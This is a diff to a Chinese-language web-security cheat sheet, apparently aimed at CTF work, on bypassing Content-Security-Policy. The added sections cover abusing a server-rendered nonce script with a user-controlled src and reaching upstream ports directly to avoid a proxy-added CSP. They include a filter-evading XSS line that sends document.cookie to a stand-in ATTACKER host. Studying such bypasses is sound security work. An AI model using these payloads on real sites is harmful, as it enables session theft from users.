@@ -162,12 +162,21 @@ add_header Content-Security-Policy "default-src 'self'" always;
 | nonce 在 URL 中暴露 | nonce 是否出现在 URL/Referer 中 | 通过 Referer 泄露获取 nonce |
 | 固定 hash | `script-src 'sha256-xxx'` | 如果 hash 对应的脚本内容可控 |
 | nonce 被注入到攻击者控制的 script | 页面上是否有注入点可以创建 script 标签 | XSS 注入 `<script nonce="stolen">` |
+| **模板创建的合法 nonce script，src 可控** | 找"用户输入 URL 存入服务端状态 → 渲染进 `<script nonce=S src=URL>` 模板"的路由（如 `/review?u=` 存 `currentReview.document.url`，`/sandbox` 渲染 `<script nonce="<%= nonce %>" src="<%= url %>">`） | 服务器自己给攻击者 URL 盖上合法 nonce——**无需偷 nonce**，让 bot 重定向到该渲染页即执行外部脚本; iframe-only 防护同时失效（302/弹窗使该页成为 top-level） |
+
+#### 2.3.1 反代注入的 CSP——直连上游绕过
+
+**模式**: CSP 头由反向代理（Caddy/nginx）在公网端口追加，应用本身（各上游进程）不产生 CSP——网络位置能直达上游端口时 CSP 整体不存在。
+
+**检测**: ① 读 entrypoint.sh/docker-compose——上游监听地址（`php -S 127.0.0.1:900x`、gunicorn 多 worker、sidecar 服务）与反代端口映射关系; ② diff 响应头: 公网端口 vs 直连 `127.0.0.1:<上游端口>`（bot 与应用同网络命名空间时全端口可达）。
+
+**利用**: XSS/反射点在上游应用的路径上，构造 `http://127.0.0.1:9000/?x=<script>...` 让 bot 访问——无 CSP 头即普通 XSS。外带 URL 被关键字过滤（`http`、`//`）时用字符串拼接重构: `location='h'+'ttps:'+'/'+'/ATTACKER/leak?c='+document.cookie`。
 
 #### 2.3.5 CSP 脚本哈希防篡改与绕过
 
 **原理**：`script-src 'sha256-xxx'` 中 `xxx` 是 `<script>` 标签内容的 Base64 编码 SHA256 哈希。浏览器在执行内联脚本前计算脚本内容的哈希，与 CSP 声明的不匹配则拒绝执行。
 
-**场景**：CTF 题或安全加固的页面使用哈希 CSP 防止修改脚本内容。当你修改了 HTML 文件中的脚本（哪怕改一个字符），浏览器控制台报错 `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-...'"`。
+**场景**：安全加固的页面使用哈希 CSP 防止修改脚本内容。当你修改了 HTML 文件中的脚本（哪怕改一个字符），浏览器控制台报错 `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-...'"`。
 
 **检测方法**：
 1. 查看 `<meta http-equiv="Content-Security-Policy">` 标签或 HTTP 响应头中 `script-src` 是否包含 `'sha256-'`
